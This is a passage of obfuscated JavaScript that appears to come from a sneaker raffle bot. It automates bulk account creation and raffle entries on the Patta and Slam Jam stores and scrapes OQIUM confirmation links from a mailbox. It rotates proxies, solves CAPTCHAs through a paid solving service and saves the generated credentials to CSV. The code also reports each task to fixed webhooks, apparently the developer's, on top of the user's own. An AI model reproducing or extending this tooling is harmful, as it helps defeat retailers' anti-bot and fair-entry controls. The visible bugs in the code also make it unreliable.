                            _0x20f725['openBox']('INBOX', ![], _0x5b5678);
                        }
                        _0x20f725['once']('ready', function () {
                            _0x31a9e5(function (_0x379ba6, _0x4f6437) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x379ba6)
                                    throw _0x379ba6;
                                _0x20f725['seq']['search'](['UNSEEN'], function (_0x446fdb, _0x50b626) {
                                    if (!_0x50b626 || !_0x50b626['length'])
                                        console['log'](_0xd645bd() + '\x20[' + _0x14b7c7['name'] + ']\x20No\x20mails\x20found'), _0x20f725['end']();
                                    else {
                                        var _0x481911 = _0x20f725['seq']['fetch'](_0x50b626, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x481911['on']('message', function (_0x582141, _0x1ae1f7) {
                                            var _0x5e2001 = '(#' + _0x1ae1f7 + ')\x20';
                                            _0x582141['on']('body', function (_0x1c5e94, _0x4fc18d) {
                                                _0x2cd09b(_0x1c5e94, (_0x192802, _0x1c0394) => {
                                                    if (_0x1c0394['subject'] == 'Confirm\x20Your\x20Subscription' && _0x1c0394['from']['value'][0x0]['name'] == 'OQIUM') {
                                                        var _0x5423d4 = _0x1c0394['text']['split']('(')[0x1], _0x469c62 = _0x5423d4['split'](')')[0x0];
                                                        _0x3c1e9b['push'](_0x469c62);
                                                    }
                                                });
                                            }), _0x582141['once']('end', function () {
                                            });
                                        }), _0x481911['once']('error', function (_0x2b51b0) {
                                            console['log']('Fetch\x20error:\x20' + _0x2b51b0);
                                        }), _0x481911['once']('end', function () {
                                            _0x20f725['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x20f725['once']('error', function (_0x572108) {
                            console['log'](_0x572108);
                        }), _0x20f725['once']('end', async function () {
                        }), _0x20f725['connect']();
                    }
                    async function _0x5a5e12(_0x177950, _0x1b2eee, _0x581e8f) {
                        for (var _0x2bb7e9 = 0x0; _0x2bb7e9 < _0x1b2eee['length']; _0x2bb7e9++) {
                            async function _0x5d35b5(_0x425f41, _0x308fac, _0x14843b, _0x53ab48, _0x2cb81c) {
                                var _0x30dd43, _0x2bf33e = {}, _0x35ccf7 = [], _0x2d1ed9 = {}, _0x2302b2 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x110677 = Math['round'](Math['random']() * (_0x2302b2['length'] - 0x1));
                                _0x53ab48[_0x425f41]['Size'] == 'RANDOM' && (_0x53ab48[_0x425f41]['Size'] = _0x2302b2[_0x110677]);
                                !_0x53ab48 && (_0x53ab48 = {});
                                if (_0x474e1d['useRandomProxy'] = ![])
                                    var _0x24c829 = _0x2cb81c[_0x425f41]['split'](':');
                                else
                                    var _0x36f15f = Math['round'](Math['random']() * (_0x2cb81c['length'] - 0x1)), _0x24c829 = _0x2cb81c[_0x36f15f]['split'](':');
                                var _0x156450 = {
                                    'jar': _0x6f82fb,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x14843b['url'],
                                    'headers': _0x14843b['headers'],
                                    'body': JSON['stringify'](_0x2bf33e),
                                    'proxy': 'http://' + _0x24c829[0x2] + ':' + _0x24c829[0x3] + '@' + _0x24c829[0x0] + ':' + _0x24c829[0x1]
                                };
                                return _0x308fac != 'ver' && (_0x156450['url'] = _0x14843b['url'], _0x156450['headers'] = _0x14843b['headers']), _0x308fac == 'ver' && (_0x156450['method'] = 'GET', _0x156450['url'] = _0x53ab48[_0x425f41]), new Promise(function (_0x1ac177, _0x31b290) {
                                    callback = async (_0x3f4fc9, _0x911ba, _0xfa796f) => {
                                        if (!_0x3f4fc9 && _0x911ba['statusCode'] == 0xca || !_0x3f4fc9 && _0x911ba['statusCode'] == 0xc8) {
                                            if (_0x308fac != 'ver') {
                                                var _0x472c88 = await _0x476a56(_0x53ab48[_0x425f41], _0x14843b, 'dev', ![]), _0x384564 = await _0x476a56(_0x53ab48[_0x425f41], _0x14843b, 'pub', ![]);
                                                const _0x3f3d50 = {
                                                    'succesDEVMSG': { 'embeds': [_0x472c88] },
                                                    'succesPUBMSG': { 'embeds': [_0x384564] }
                                                };
                                                if (_0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '')
                                                    try {
                                                        await _0x2860ef(_0x474e1d['webhook'], _0x3f3d50['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x3f3d50['succesDEVMSG']), await _0x90116b(0xc8);
                                                try {
                                                    await _0x2860ef(_0x3c50b7, _0x3f3d50['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x2812a5(_0x53ab48[_0x425f41], _0x14843b);
                                            }
                                            _0x1ac177(console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x14843b['name'] + ']\x20Task\x20' + (_0x425f41 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x308fac != 'ver') {
                                                var _0x20fe69 = '' + _0x3f4fc9, _0x42286f = await _0x476a56(_0x53ab48[_0x425f41], _0x14843b, 'dev', !![], _0x20fe69), _0x47262f = {};
                                                _0x47262f['errorDEV'] = { 'embeds': [_0x42286f] }, _0x78fa55(_0x53ab48[_0x425f41], _0x14843b), _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x47262f['errorDEV']), await _0x2860ef(_0x406b45, _0x47262f['errorDEV']);
                                            }
                                            _0x31b290(console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x14843b['name'] + ']\x20Task\x20' + (_0x425f41 + 0x1) + ':\x20' + _0x3f4fc9)));
                                        }
                                    };
                                    try {
                                        _0x308fac != 'ver' ? console['log'](_0xd645bd() + '\x20[' + _0x14843b['name'] + ']\x20Task\x20' + (_0x425f41 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2bf33e['data']['attributes']['email']) : console['log'](_0xd645bd() + '\x20[' + _0x14843b['name'] + ']\x20Task\x20' + (_0x425f41 + 0x1) + ':\x20Fetching\x20Response'), _0x38301a(_0x156450, callback);
                                    } catch (_0x2d0292) {
                                        console['log'](_0xd645bd() + '\x20Task\x20' + (_0x425f41 + 0x1) + ':\x20' + _0x2d0292);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5d35b5(_0x2bb7e9, 'ver', _0x177950, _0x1b2eee, _0x581e8f), console['log'](_0xd645bd() + '\x20[' + _0x177950['name'] + ']\x20Sleeping\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                            } catch (_0x39fbd3) {
                            }
                        }
                    }
                    try {
                        _0x423351(), await _0x90116b(0xfa0), console['log']('Found\x20' + _0x3c1e9b['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x5a5e12(_0x14b7c7, _0x3c1e9b, _0x5c5c24);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x470894, _0x3d5541, _0x832549) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5b8294 = 0x0; _0x5b8294 < _0x3d5541['length']; _0x5b8294++) {
                        var _0x5bd94 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x54e6a5
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x474e1d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1144ef
                                }
                            ]
                        }];
                        const _0x32dd6b = { 'embeds': _0x5bd94 };
                        _0x4e8779(_0x470894['name'] + '\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20/\x20' + _0x3d5541['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x3d5541, _0x5b8294);
                        var _0x3bb36e = await _0x476a56(_0x3d5541[_0x5b8294], _0x470894, 'acc', ![]);
                        const _0x8c0ec4 = { 'succesDEVMSG': { 'embeds': [_0x3bb36e] } };
                        if (_0x3d5541[_0x5b8294]['Email'] == '' || _0x3d5541[_0x5b8294]['FirstName'] == '' || _0x3d5541[_0x5b8294]['LastName'] == '') {
                            console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x90116b(0x7d0);
                            continue;
                        }
                        (_0x3d5541[_0x5b8294]['Password'] == '' || _0x3d5541[_0x5b8294] == undefined) && _0x3d5541[_0x5b8294]['Password'] == 'JRaffles23!';
                        if (_0x474e1d['useRandomProxy'] = ![])
                            var _0x3ce9fe = _0x832549[_0x5b8294]['split'](':');
                        else
                            var _0x4be451 = Math['round'](Math['random']() * (_0x832549['length'] - 0x1)), _0x3ce9fe = _0x832549[_0x4be451]['split'](':');
                        const _0x2961e1 = await _0x51bd0a['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x3ce9fe[0x0] + ':' + _0x3ce9fe[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x35f12d = await _0x2961e1['newPage']();
                            await _0x35f12d['authenticate']({
                                'username': '' + _0x3ce9fe[0x2],
                                'password': '' + _0x3ce9fe[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x470894['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x35f12d['setRequestInterception'](!![]), _0x35f12d['on']('request', _0x1da5cf => {
                                _0x1da5cf['resourceType']() === 'image' || _0x1da5cf['resourceType']() === 'font' || _0x1da5cf['resourceType']() === 'media' ? _0x1da5cf['abort']() : _0x1da5cf['continue']();
                            }), await _0x35f12d['goto']('https://patta.nl/account/register'), await _0x90116b(0xbb8), await _0x35f12d['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xd645bd() + '\x20[' + _0x470894['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Filling\x20information'), await _0x35f12d['type']('#RegisterForm-FirstName', '' + _0x3d5541[_0x5b8294]['FirstName']), await _0x90116b(0x226), await _0x35f12d['type']('#RegisterForm-LastName', '' + _0x3d5541[_0x5b8294]['LastName']), await _0x90116b(0x226), await _0x35f12d['type']('#RegisterForm-email', '' + _0x3d5541[_0x5b8294]['Email']), await _0x90116b(0x226), await _0x35f12d['type']('#RegisterForm-password', '' + _0x3d5541[_0x5b8294]['Password']), await _0x90116b(0x226), console['log'](_0xd645bd() + '\x20[' + _0x470894['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Submitting..'), await _0x35f12d['$eval']('#RegisterForm', _0x3de4f3 => _0x3de4f3['submit']()), await _0x90116b(0x1f40);
                            try {
                                await _0x35f12d['waitForSelector']('.home-page-grid__collection'), await _0x90116b(0x1f4), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x470894['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Account\x20' + _0x3d5541[_0x5b8294]['Email'] + '\x20Generated!')), _0x396fe9['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3d5541[_0x5b8294]['Email'] + ',' + _0x3d5541[_0x5b8294]['Password']), console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x470894['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Account\x20' + _0x3d5541[_0x5b8294]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x8c0ec4['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2860ef(_0x29555e, _0x8c0ec4['succesDEVMSG']);
                            } catch (_0x1f172a) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x1f172a));
                            }
                        } catch (_0x54bdb6) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x5b8294 + 0x1) + '\x20:\x20' + _0x54bdb6));
                        } finally {
                            _0x2961e1 && _0x2961e1['close'](), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x525398, _0x37ca37, _0x144b0f) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x11f2d0 = 0x0; _0x11f2d0 < _0x37ca37['length']; _0x11f2d0++) {
                        var _0x1b6b92;
                        if (_0x3eee46 != 'yes')
                            var _0x3eee46 = '', _0x3bf38b = 0x0;
                        _0x4e8779(_0x525398['name'] + '\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20/\x20' + _0x37ca37['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x37ca37, _0x11f2d0);
                        if (_0x37ca37[_0x11f2d0]['Email'] == '' || _0x37ca37[_0x11f2d0]['Password'] == '' || _0x37ca37[_0x11f2d0]['FirstName'] == '' || _0x37ca37[_0x11f2d0]['LastName'] == '') {
                            console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x474e1d['useRandomProxy'] = ![])
                            var _0x443458 = _0x144b0f[_0x11f2d0]['split'](':');
                        else
                            var _0x3bcc3c = Math['round'](Math['random']() * (_0x144b0f['length'] - 0x1)), _0x443458 = _0x144b0f[_0x3bcc3c]['split'](':');
                        const _0x317847 = await _0x51bd0a['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0x443458[0x0] + ':' + _0x443458[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x37243c = await _0x317847['newPage']();
                            await _0x37243c['authenticate']({
                                'username': '' + _0x443458[0x2],
                                'password': '' + _0x443458[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x37243c['setRequestInterception'](!![]), _0x37243c['on']('request', _0x5f4d77 => {
                                _0x5f4d77['resourceType']() === 'image' || _0x5f4d77['resourceType']() === 'font' || _0x5f4d77['resourceType']() === 'media' ? _0x5f4d77['abort']() : _0x5f4d77['continue']();
                            }), await _0x37243c['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x37243c['waitForSelector']('#CustomerEmail'), console['log'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x37243c['type']('#CustomerEmail', '' + _0x37ca37[_0x11f2d0]['Email']), await _0x90116b(0x12c), await _0x37243c['type']('#CustomerPassword', '' + _0x37ca37[_0x11f2d0]['Password']), await _0x90116b(0x226), await _0x37243c['$eval']('#customer_login', _0x4810f6 => _0x4810f6['submit']());
                            try {
                                await _0x37243c['waitForSelector']('#orders'), await _0x90116b(0x4b0);
                            } catch {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x37243c['goto']('' + _0x37ca37[_0x11f2d0]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x90116b(0xbb8), console['log'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x37243c['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x37243c['type']('#email', '' + _0x37ca37[_0x11f2d0]['Email']), await _0x90116b(0x384), await _0x37243c['type']('#first_name', '' + _0x37ca37[_0x11f2d0]['FirstName']), await _0x90116b(0x514), await _0x37243c['type']('#last_name', '' + _0x37ca37[_0x11f2d0]['LastName']), await _0x90116b(0x514), await _0x37243c['type']('#street_address', _0x37ca37[_0x11f2d0]['Address1'] + '\x20' + _0x37ca37[_0x11f2d0]['HouseNumber'] + '\x20' + _0x37ca37[_0x11f2d0]['Address2']), await _0x90116b(0x2bc);
                            _0x37ca37[_0x11f2d0]['Postcode'] == undefined && (_0x37ca37[_0x11f2d0]['Postcode'] = _0x37ca37[_0x11f2d0]['Zip']);
                            await _0x37243c['type']('#zip_code', '' + _0x37ca37[_0x11f2d0]['Postcode']), await _0x90116b(0x320), await _0x37243c['type']('#city', '' + _0x37ca37[_0x11f2d0]['City']), await _0x90116b(0x320), await _0x37243c['type']('#bday', '01/01/1994'), await _0x90116b(0x320), await _0x37243c['type']('#instagram', '' + _0x37ca37[_0x11f2d0]['Follower']), await _0x90116b(0x352);
                            if (_0x37ca37[_0x11f2d0]['Size'] == 'RANDOM') {
                                const _0x472807 = await _0x37243c['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x41ec18 => {
                                    return _0x41ec18['map'](_0x2dd883 => _0x2dd883['textContent']);
                                });
                                var _0x5960e9 = Math['round'](Math['random']() * (_0x472807['length'] - 0x1));
                                console['log'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x472807[_0x5960e9]), await _0x37243c['click']('label[data-eu-size=\x22' + _0x472807[_0x5960e9] + '\x22]');
                            } else {
                                console['log'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x37ca37[_0x11f2d0]['Size']);
                                try {
                                    await _0x37243c['click']('label[data-eu-size=\x22' + _0x37ca37[_0x11f2d0]['Size'] + '\x22]');
                                } catch {
                                    await _0x37243c['click']('label[data-eu-size=\x22' + _0x37ca37[_0x11f2d0]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x90116b(0xbb8), await _0x37243c['$$eval']('.raffle__checkbox-label', _0x5f0ac4 => _0x5f0ac4['forEach'](_0x300950 => _0x300950['click']())), await _0x90116b(0x7d0), console['log'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x37243c['click']('#raffle__form-submit'), await _0x90116b(0x1388);
                            try {
                                await _0x37243c['waitForSelector']('#raffle__confirmation-message-container'), _0x3eee46 = 'no', _0x2812a5(_0x37ca37[_0x11f2d0], _0x525398), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x50f4d8) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x50f4d8));
                            }
                        } catch (_0xb9aa8b) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20' + _0xb9aa8b)), _0x3eee46 = 'yes';
                        } finally {
                            _0x317847 && _0x317847['close']();
                            if (_0x3eee46 == 'yes' && _0x3bf38b != 0x5 && _0x1b6b92 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x525398['name'] + ']\x20Task\x20' + (_0x11f2d0 + 0x1) + '\x20:\x20Retrying')), _0x11f2d0 = _0x11f2d0 - 0x1, _0x3bf38b = _0x3bf38b + 0x1;
                                continue;
                            }
                            _0x3eee46 == 'yes' && _0x3bf38b >= 0x5 && (_0x78fa55(_0x37ca37[_0x11f2d0], _0x525398), _0x3eee46 = 'no', _0x3bf38b = 0x0), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x1eca15, _0x2dd076, _0x57c863) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2962e5 = 0x0; _0x2962e5 < _0x2dd076['length']; _0x2962e5++) {
                        if (_0x4ac0ba != 'yes')
                            var _0x4ac0ba = '', _0x57b718 = 0x0;
                        var _0x493894 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x54e6a5
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x474e1d['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1144ef
                                }
                            ]
                        }];
                        const _0x1a665f = { 'embeds': _0x493894 };
                        _0x4e8779(_0x1eca15['name'] + '\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20/\x20' + _0x2dd076['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x2dd076, _0x2962e5);
                        var _0x34576f = await _0x476a56(_0x2dd076[_0x2962e5], _0x1eca15, 'acc', ![]);
                        const _0x5250c4 = { 'succesDEVMSG': { 'embeds': [_0x34576f] } };
                        if (_0x2dd076[_0x2962e5]['Email'] == '' || _0x2dd076[_0x2962e5]['FirstName'] == '' || _0x2dd076[_0x2962e5]['LastName'] == '') {
                            console['log'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x90116b(0x7d0);
                            continue;
                        }
                        (_0x2dd076[_0x2962e5]['Password'] == '' || _0x2dd076[_0x2962e5] == undefined) && _0x2dd076[_0x2962e5]['Password'] == 'JRaffles23!';
                        if (_0x474e1d['useRandomProxy'] = ![])
                            var _0x1637a1 = _0x57c863[_0x2962e5]['split'](':');
                        else
                            var _0x39dc81 = Math['round'](Math['random']() * (_0x57c863['length'] - 0x1)), _0x1637a1 = _0x57c863[_0x39dc81]['split'](':');
                        const _0x2d43bb = await _0x51bd0a['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x1637a1[0x0] + ':' + _0x1637a1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0xc7dda9 = await _0x2d43bb['newPage']();
                            await _0xc7dda9['authenticate']({
                                'username': '' + _0x1637a1[0x2],
                                'password': '' + _0x1637a1[0x3]
                            }), console['log'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xc7dda9['setRequestInterception'](!![]), _0xc7dda9['on']('request', _0xc4c302 => {
                                _0xc4c302['resourceType']() === 'image' || _0xc4c302['resourceType']() === 'font' || _0xc4c302['resourceType']() === 'media' ? _0xc4c302['abort']() : _0xc4c302['continue']();
                            }), await _0xc7dda9['goto']('https://drop.slamjam.com/account/register'), await _0x90116b(0xbb8), await _0xc7dda9['waitForSelector']('#FirstName'), await _0xc7dda9['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xc7dda9['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Filling\x20information'), await _0x90116b(0x4b0), await _0xc7dda9['type']('#FirstName', '' + _0x2dd076[_0x2962e5]['FirstName']), await _0x90116b(0x226), await _0xc7dda9['type']('#LastName', '' + _0x2dd076[_0x2962e5]['LastName']), await _0x90116b(0x226), await _0xc7dda9['type']('#Email', '' + _0x2dd076[_0x2962e5]['Email']), await _0x90116b(0x2ee), await _0xc7dda9['type']('#ConfirmEmail', '' + _0x2dd076[_0x2962e5]['Email']), await _0x90116b(0x2ee), await _0xc7dda9['type']('#CreatePassword', '' + _0x2dd076[_0x2962e5]['Password']), await _0x90116b(0x2ee), await _0xc7dda9['type']('#CreateConfirmPassword', '' + _0x2dd076[_0x2962e5]['Password']), await _0x90116b(0x226), console['log'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Submitting..'), await _0xc7dda9['$eval']('#create_customer', _0x5ee289 => _0x5ee289['submit']()), await _0x90116b(0x1388), console['log'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20' + _0x5bbbd3['cyan']('Solving\x20Captcha')), await _0xc7dda9['solveRecaptchas'](), console['log'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xc7dda9['$eval']('.shopify-challenge__container\x20>\x20form', _0x44a846 => _0x44a846['submit']());
                            try {
                                await _0xc7dda9['waitForSelector']('.product-card__image'), await _0x90116b(0x1f4), _0x4ac0ba = 'no', console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Account\x20' + _0x2dd076[_0x2962e5]['Email'] + '\x20Generated!')), _0x396fe9['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x2dd076[_0x2962e5]['Email'] + ',' + _0x2dd076[_0x2962e5]['Password']), console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Account\x20' + _0x2dd076[_0x2962e5]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x5250c4['succesDEVMSG']);
                                } catch {
                                }
                                await _0x2860ef(_0x29555e, _0x5250c4['succesDEVMSG']);
                            } catch (_0x45624c) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x45624c));
                            }
                        } catch (_0x1150cf) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20' + _0x1150cf));
                        } finally {
                            _0x2d43bb && _0x2d43bb['close']();
                            if (_0x4ac0ba == 'yes' && _0x57b718 != 0x5) {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x1eca15['name'] + ']\x20Task\x20' + (_0x2962e5 + 0x1) + '\x20:\x20Retrying')), _0x2962e5 = _0x2962e5 - 0x1, _0x57b718 = _0x57b718 + 0x1;
                                continue;
                            }
                            _0x4ac0ba == 'yes' && _0x57b718 >= 0x5 && (_0x78fa55(_0x2dd076[_0x2962e5], _0x1eca15), _0x4ac0ba = 'no', _0x57b718 = 0x0), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
